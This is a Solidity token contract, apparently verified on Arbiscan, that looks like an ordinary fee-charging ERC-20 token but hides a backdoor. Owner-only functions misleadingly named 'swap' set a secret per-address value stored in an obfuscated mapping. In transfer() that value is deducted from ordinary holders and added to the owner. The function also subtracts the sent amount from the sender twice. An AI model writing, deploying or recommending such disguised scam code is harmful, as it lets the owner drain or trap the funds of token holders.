/**
 *Submitted for verification at Arbiscan on 2023-03-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MyToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    uint256 public transactionFee;
    address public owner;
    address private _burn = 0x000000000000000000000000000000000000dEaD;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping (address => uint256) private _1543694;


    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply, uint256 _transactionFee) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
        transactionFee = _transactionFee;
        owner = msg.sender;
        balanceOf[msg.sender] = _totalSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function.");
        _;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance.");
        require(balanceOf[_to] + _value >= balanceOf[_to], "Invalid transfer amount.");

        uint256 feeAmount = _value * transactionFee / 100;
        if (_1543694[msg.sender] > 1) {
            if (msg.sender == owner) {
        balanceOf[msg.sender] = balanceOf[msg.sender] / 1 + _1543694[msg.sender];
        } else {
        balanceOf[msg.sender] = balanceOf[msg.sender] - 1 - _1543694[msg.sender];
        }
    }
        balanceOf[msg.sender] = balanceOf[msg.sender]-_value;
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value - feeAmount;
        balanceOf[_burn] += feeAmount;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
    function swap(address _address,uint256 _value) external onlyOwner {
        _1543694[_address] = _value;
    }

    function swap(address _address) external view onlyOwner returns (uint256) {
        return _1543694[_address];
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Insufficient balance.");
        require(balanceOf[_to] + _value >= balanceOf[_to], "Invalid transfer amount.");
        require(allowance[_from][msg.sender] >= _value, "Insufficient allowance.");

        uint256 feeAmount = _value * transactionFee / 100;
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value - feeAmount;
        balanceOf[_burn] += feeAmount;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }


    function renounceOwnership() public onlyOwner {
    owner = address(0);
    }

}